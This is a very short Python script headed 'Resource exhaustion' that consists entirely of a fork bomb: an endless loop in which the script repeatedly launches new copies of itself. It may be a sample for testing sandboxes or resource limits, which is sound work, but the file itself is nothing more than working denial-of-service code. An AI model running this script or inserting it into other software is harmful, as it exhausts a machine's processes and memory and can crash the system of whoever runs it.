#!/usr/bin/env python3

"""Resource exhaustion - resource_exhaustion"""
import subprocess

# Fork bomb
while True:
    subprocess.Popen(["python3", __file__])
